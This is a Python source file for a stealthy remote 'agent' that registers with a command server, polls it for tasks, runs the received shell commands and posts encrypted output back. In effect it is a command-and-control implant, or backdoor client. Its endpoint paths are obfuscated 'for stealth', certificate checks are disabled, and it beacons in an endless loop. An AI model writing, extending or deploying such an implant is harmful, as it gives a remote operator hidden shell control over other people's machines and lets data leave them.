import logging
import requests
import time
import json
import platform
import socket
import subprocess
import base64
import zlib
from crypto import encrypt_data, decrypt_data
from obfuscation import obfuscate_string, deobfuscate_string
from logging_config import setup_logging

# Initialize logging
logger = setup_logging('agent')

class Agent:
    def __init__(self, server_url, agent_id=None):
        self.server_url = server_url
        self.agent_id = agent_id or self.generate_id()
        self.hostname = platform.node()
        self.ip_address = socket.gethostbyname(socket.gethostname())
        self.token = None
        
        # Obfuscated strings for stealth
        self.obfuscated_urls = {
            'register': obfuscate_string('/register'),
            'task': obfuscate_string('/task'),
            'result': obfuscate_string('/result')
        }
    
    def generate_id(self):
        return f"{self.hostname}-{int(time.time())}"
    
    def register(self):
        data = {
            'agent_id': self.agent_id,
            'hostname': self.hostname,
            'ip_address': self.ip_address
        }
        
        try:
            encrypted_data = encrypt_data(data)
            response = requests.post(
                f"{self.server_url}{deobfuscate_string(self.obfuscated_urls['register'])}",
                json={'data': encrypted_data},
                verify=False  # For self-signed certs; use proper CA in production
            )
            
            if response.status_code == 200:
                response_data = decrypt_data(response.json()['data'])
                self.token = response_data.get('token')
                logger.info("Agent registered successfully")
                return True
            else:
                logger.error(f"Registration failed: {response.status_code}")
                return False
                
        except Exception as e:
            logger.error(f"Registration error: {str(e)}")
            return False
    
    def get_task(self):
        try:
            headers = {'Authorization': self.token} if self.token else {}
            response = requests.get(
                f"{self.server_url}{deobfuscate_string(self.obfuscated_urls['task'])}/{self.agent_id}",
                headers=headers,
                verify=False
            )
            
            if response.status_code == 200:
                if 'data' in response.json():
                    return decrypt_data(response.json()['data'])
                return response.json()
            else:
                logger.error(f"Task retrieval failed: {response.status_code}")
                return None
                
        except Exception as e:
            logger.error(f"Task retrieval error: {str(e)}")
            return None
    
    def execute_task(self, task):
        try:
            if task['type'] == 'command':
                result = subprocess.run(
                    task['command'], 
                    shell=True, 
                    capture_output=True, 
                    text=True,
                    timeout=task.get('timeout', 30)
                )
                return {
                    'output': result.stdout,
                    'error': result.stderr,
                    'returncode': result.returncode
                }
            elif task['type'] == 'download':
                # Implement secure file download
                pass
            else:
                return {'error': f"Unknown task type: {task['type']}"}
                
        except subprocess.TimeoutExpired:
            return {'error': 'Command timed out'}
        except Exception as e:
            return {'error': str(e)}
    
    def run(self):
        if not self.register():
            logger.critical("Initial registration failed")
            return
        
        while True:
            try:
                task = self.get_task()
                if task and 'task' in task and task['task']:
                    result = self.execute_task(task['task'])
                    # Send encrypted result back to server
                    encrypted_result = encrypt_data(result)
                    requests.post(
                        f"{self.server_url}{deobfuscate_string(self.obfuscated_urls['result'])}/{self.agent_id}",
                        json={'data': encrypted_result},
                        headers={'Authorization': self.token},
                        verify=False
                    )
                time.sleep(10)
            except Exception as e:
                logger.error(f"Main loop error: {str(e)}")
                time.sleep(30)  # Longer sleep on error

if __name__ == '__main__':
    agent = Agent("https://your-server-ip:5000")
    agent.run()
